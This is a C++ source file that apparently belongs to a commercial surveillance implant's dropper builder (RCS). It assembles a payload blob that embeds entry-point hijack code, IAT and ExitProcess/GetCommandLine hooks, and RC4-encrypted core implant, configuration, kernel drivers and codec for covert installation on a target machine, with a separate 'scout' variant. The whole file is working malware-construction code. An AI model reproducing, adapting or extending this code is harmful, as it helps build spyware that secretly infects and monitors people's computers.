#include <iomanip>
#include <list>
#include <string>
using namespace std;

#include <boost/shared_ptr.hpp>
#include <boost/filesystem/fstream.hpp>
namespace bf = boost::filesystem;

#include <aplib.h>

#include "../../RCSDropper/DropperCode.h"
#include "Components.h"
#include "RCSPayload.h"
#include "RCSConfig.h"

extern std::string productVersion;

#define OFFSET(x) do { *((DWORD*) x) = offset_(x); x += sizeof(DWORD); } while(0)

RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout, char *scout_name )
: rcs_(rcs), components_(components), cookedSize_(0)
{
	if (!bScout)
	{
		cout << endl;
		cout << "Building dropper stub with following configuration" << endl;
		cout << endl;

		cout << "Core (32bit)   : " << rcs_.core() << endl;
		cout << "Core (64bit)   : " << (rcs_.core64().empty() ? "none" : rcs_.core64()) << endl;
		cout << "Config         : " << rcs_.config() << endl;
		cout << "Driver (32bit) : " << (rcs_.driver().empty() ? "none" : rcs_.driver()) << endl;
		cout << "Driver (64bit) : " << (rcs_.driver64().empty() ? "none" : rcs_.driver64()) << endl;
		cout << "Codec          : " << rcs_.codec() << endl;
		cout << "Install dir    : " << rcs_.directory() << endl;
		cout << "Manifest       : " << (rcs_.manifest() ? "true" : "false" ) << endl;
		cout << "Installer		: " << (rcs_.installer() ? "true" : "false" ) << endl;

		cout << endl;

		cout << "Core (32bit) size   : " << setw(8) << right << rcs_.core_size() << " bytes" << endl; 
		cout << "Core (64bit) size   : " << setw(8) << right << rcs_.core64_size() << " bytes" << endl;
		cout << "Config size         : " << setw(8) << right << rcs_.config_size() << " bytes" << endl;
		cout << "Driver (32bit) size : " << setw(8) << right << rcs_.driver_size() << " bytes" << endl;
		cout << "Driver (64bit) size : " << setw(8) << right << rcs_.driver64_size() << " bytes" << endl;
		cout << "Codec size          : " << setw(8) << right << rcs_.codec_size() << " bytes" << endl;

		cout << endl;

		unsigned int buffer_size = 
			alignToDWORD( sizeof(DataSectionHeader) )
			+ rcs_.core_size()
			+ rcs_.core64_size()
			+ rcs_.config_size()
			+ rcs_.driver_size()
			+ rcs_.driver64_size()
			+ rcs_.codec_size()
			+ 69535; // account for strings, etc.

		cooked_.reset( new char[buffer_size] );

		char* ptr = cooked_.get();
		cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;

		// HEADER
		DataSectionHeader* header = (DataSectionHeader*) ptr;
		memset(header, 0, sizeof(DataSectionHeader));
		header->isScout = 0;

		// RC4 key
		PBYTE encryptionKey = (PBYTE)malloc(32);
		srand(time(NULL));
		for (ULONG i=0; i<64; i++)
			header->rc4key[i] = rand();


		ptr += sizeof(DataSectionHeader);
		cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;

		
		// MARKER
		DWORD offset = sizeof(DataSectionHeader);
		cout << "Sizeof DataSectionHeader: " << hex << offset << endl;
		memcpy(ptr, &offset, sizeof(offset));
		ptr += sizeof(offset);
		END_MARKER(ptr);

		// HEADER -> cooker version
		cout << "VERSION => " << productVersion.c_str() << endl;
		memcpy(header->version, productVersion.c_str(), productVersion.length() + 1);
		cout << "INSTDIR => " << rcs_.directory().c_str() << endl;
		memcpy(header->instDir, rcs_.directory().c_str(), strlen(rcs_.directory().c_str()));
		cout << "EXPORTS => " << rcs_.func().c_str() << endl;
		memcpy(header->eliteExports, rcs_.func().c_str(), 21);

		//header->offsetToHeader = offset;
		//END_MARKER(&header->headerEndMarker);

		// DROPPER CODE

		// entry point must always be the first function copied
		if (!rcs_.installer())
		{
			ptr += embedFunction_(components.entryPoint(), header->functions.newEntryPoint, ptr);
			//END_MARKER(ptr);
			ptr += embedFunction_(components.coreThread(), header->functions.coreThread, ptr);
			ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr);
			ptr += embedFunction_(components.hookIAT(), header->functions.hookIAT, ptr);
			ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
			ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
			ptr += embedFunction_(components.getCommandLineAHook(), header->functions.GetCommandLineAHook, ptr);
			ptr += embedFunction_(components.getCommandLineWHook(), header->functions.GetCommandLineWHook, ptr);
		}

		// RCS FILES

		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr, header->rc4key);
		ptr += embedFile_(rcs.config(), header->files.names.config, header->files.config, ptr, header->rc4key);
		if ( rcs_.core64_size() ) {
			ptr += embedFile_(rcs.core64(), header->files.names.core64, header->files.core64, ptr, header->rc4key);
		}
		if ( rcs_.codec_size() ) {
			ptr += embedFile_(rcs.codec(), header->files.names.codec, header->files.codec, ptr, header->rc4key);
		}

		if ( rcs_.driver_size() ) 
		{
			if ( rcs_.driver().filename() != string("none"))
				//if ( strcmp(rcs_.driver().filename().com .c_str(), "null") )
				ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr, header->rc4key);
		}


		if (rcs_.driver64_size() ) 
		{
			if ( rcs_.driver64().filename() != string("none"))
				ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr, header->rc4key);
		}

		cookedSize_ = ptr - cooked_.get();
		cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
	}
	else // scout
	{
		
		unsigned int buffer_size = 
			alignToDWORD( sizeof(DataSectionHeader) )
			+ rcs_.core_size()
			+ 69535; // account for strings, etc.

		cout << "Building dropper stub for scout, size: " << rcs_.core_size() << endl;

		cooked_.reset( new char[buffer_size] );
		char* ptr = cooked_.get();
		cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;

		// HEADER
		DataSectionHeader* header = (DataSectionHeader*) ptr;
		memset(header, 0, sizeof(DataSectionHeader));
		header->isScout = 1; // SCOUT

		// RC4 key
		PBYTE encryptionKey = (PBYTE)malloc(32);
		srand(time(NULL));
		for (ULONG i=0; i<64; i++)
			header->rc4key[i] = rand();

		ptr += sizeof(DataSectionHeader);
		cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;
		cout << __FUNCTION__ << " HEADER size: 0x" << hex << sizeof(DataSectionHeader) << endl;

		// HEADER -> cooker version
		memcpy(header->version, productVersion.c_str(), productVersion.length() + 1);

		// HEADER -> scout name
		memcpy(header->eliteExports, scout_name, strlen(scout_name)+1);

		OFFSET(ptr);
		END_MARKER(ptr);

		ptr += embedFunction_(components.entryPoint(), header->functions.newEntryPoint, ptr); 
		ptr += embedFunction_(components.hookIAT(), header->functions.hookIAT, ptr); 
		ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
		ptr += embedFunction_(components.load(), header->functions.load, ptr);
		ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
		ptr += embedFunction_(components.getCommandLineAHook(), header->functions.GetCommandLineAHook, ptr);
		ptr += embedFunction_(components.getCommandLineWHook(), header->functions.GetCommandLineWHook, ptr);

		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr, header->rc4key);
		cookedSize_ = ptr - cooked_.get();
		cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
	}

}

std::size_t RCSPayload::embedFunction_( const DataBuffer& source, DataSectionBlob& func, char *ptr )
{
	if (source.size) {
		func.size = (DWORD) source.size;
		memcpy(ptr, source.data.get(), func.size);
		func.offset = ((DWORD)ptr - (DWORD)cooked_.get());
	}
	
	cout << __FUNCTION__ << " size: " << alignToDWORD( source.size ) << endl;
	return alignToDWORD( source.size );
}

unsigned int ratio(unsigned int x, unsigned int y)
{
	if (x <= UINT_MAX / 100) x *= 100; else y /= 100;
	if (y == 0) y = 1;
	return x / y;
}

int __stdcall callback(unsigned int insize, unsigned int inpos, unsigned int outpos, void *cbparam)
{
	printf("\rcompressed %u -> %u bytes (%u%% done)", inpos, outpos, ratio(inpos, insize));
	return 1;
}

void rc4_encrypt(
	const unsigned char *key, 
	size_t keylen, 
	size_t skip,
	unsigned char *data, 
	size_t data_len)
{
	unsigned int i, j, k;
	unsigned char *pos;
	size_t kpos;
		
	unsigned char *S = (unsigned char*) malloc(256);
	
	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}
	
	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}
	
	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}

	free(S);
}


std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr, char *key)
{
	// TODO move to auto pointers

	std::size_t size = (DWORD) bf::file_size(path);
	cout << __FUNCTION__ << " file size: " << size << " for " << path << endl;
	if (size == 0)
		return 0;
	
	// save original size
	file.original_size = size;

	// save name of file
	char* p = ptr;
	name.offset = ((DWORD)p - (DWORD)cooked_.get());
	
	std::string filename = path.filename();
	cout << __FUNCTION__ << " file name size: " << filename.size() << endl;
	name.size = (DWORD) filename.size() + 1;
	memcpy(ptr, filename.c_str(), name.size);
	p += name.size;
	
	// open file
	file.offset = ((DWORD)p - (DWORD)cooked_.get());
	bf::ifstream fs;
	fs.open(path, ios::in | ios::binary);
	
	// read file

	char* buf = new char[size];

	fs.read(buf, size);
	std::size_t n = fs.gcount();
	/*
	// compress data
	char* packed = new char[aP_max_packed_size(size)];
	char *workmem = new char[aP_workmem_size(size)];
	
	int packed_size = aP_pack(buf, packed, size, workmem, callback, NULL);
	printf("\n");
	if (packed_size == APLIB_ERROR) {
		printf("Error compressing!\n");
		return 0;
	}
	*/
	char *packed = buf;
	int packed_size = size;
	rc4_encrypt((unsigned char*)key, RC4KEYLEN, 0, (unsigned char *)packed, packed_size);
    
	//delete [] buf;
	
	// save compressed size
	file.size = packed_size;
	
//	if (workmem) {
//		delete [] workmem;
//		workmem = NULL;
//	}
	
	// encrypt

	// write compressed to buffer
	memcpy(p, packed, packed_size);

	p += packed_size;

	
	delete [] packed;
	
	std::size_t ret = ((DWORD)p - (DWORD)ptr);
	cout << __FUNCTION__ << " size: " << dec << ret << endl;
	
	return ret;
}


std::size_t RCSPayload::embedStrings_( RCSConfig &rcs, DataSectionHeader* header, char* ptr )
{
	/*
	char* p = ptr;
	
	std::list<std::string> strings;

	// add installation directory
	strings.push_back(rcs.directory());

	// copy all dropper strings
//	int i = 0;
//	while (_needed_strings[i] != NULL) {
//		strings.push_back(std::string(_needed_strings[i]));
//		i++;
//	}
	
	// reserve space for string offsets
	header->stringsOffsets.offset = offset_(p);
	DWORD * strOffset = (DWORD *) p;
	p += strings.size() * sizeof(DWORD);
	
	header->strings.offset = offset_(p);
	unsigned int idx = 0;
	for ( std::list<std::string>::iterator iter = strings.begin();
		iter != strings.end(); 
		iter++, idx++ )
	{
		// store offset of string
		DWORD offset =  offset_(p) - header->strings.offset; 
		(*strOffset) = offset;
		strOffset++;

		// store string data
		(void) memcpy( p, (*iter).c_str(), (*iter).size() + 1);
		if (idx == STRIDX_COMMAHFF8)
			memcpy(p+2, rcs.func().c_str(), 6);
		else if (idx == STRIDX_HFF5)
			memcpy(p, rcs.func().c_str(), 6);

		cout << __FUNCTION__ << " embedding string: " << p << " [" << (*iter).size() + 1 << " bytes]" << endl;
		
		p += (*iter).size() + 1;
	}
	header->strings.size = offset_(p) - header->strings.offset;
	
	std::size_t ret = ((DWORD)p - (DWORD)ptr);
	cout << __FUNCTION__ << " size: " << ret << endl;
	
	return ret;
	*/
}

std::size_t RCSPayload::embedDllCalls_( DataSectionHeader* header, char* ptr )
{
	/*
	char* p = ptr;

	// Calls
	header->dlls.offset = p - cooked_.get();
	DWORD totalCalls = 0;
	for ( int i = 0; data_imports[i].dll; i++ )
	{
		// account for nCalls field
		char* ptrToNCalls = p;
		p += sizeof(DWORD);

		// dll name
		(void) memcpy( p, data_imports[i].dll, strlen(data_imports[i].dll) + 1 );
		cout << __FUNCTION__ << " DLL: " << p << endl;
		p += (UINT)strlen(data_imports[i].dll) + 1;

		// copy call names
		DWORD nCalls = 0;
		for ( int iD = 0; data_imports[i].calls[iD] != NULL; iD++ )
		{
			(void) memcpy( p, data_imports[i].calls[iD], strlen(data_imports[i].calls[iD]) + 1);
			cout << __FUNCTION__ << " - call: " << p << endl;
			p += (UINT)strlen(data_imports[i].calls[iD]) + 1;
			nCalls++;
		}
		
		// fill nCalls field
		memcpy(ptrToNCalls, &nCalls, sizeof(nCalls));
		totalCalls += nCalls;
	}
	header->dlls.size = p - (cooked_.get() + header->dlls.offset);
	
	cout << __FUNCTION__ << " total calls: " << totalCalls << endl;
	
	// reserve space for Dll callst addresses
	header->callAddresses.offset = p - cooked_.get();
	header->callAddresses.size = totalCalls * sizeof(DWORD);
	cout << __FUNCTION__ << " reserving " << header->callAddresses.size << " bytes for call addresses." << endl;
	p += header->callAddresses.size;
	
	std::size_t ret = ((DWORD)p - (DWORD)ptr);
	cout << __FUNCTION__ << " size: " << ret << endl;
	return ret;
	*/
}

bool RCSPayload::write( bf::path file )
{
	bf::ofstream of(file, ios::out | ios::binary);
	
	of.write(cooked_.get(), cookedSize_);
	of.close();
	
	return true;
}

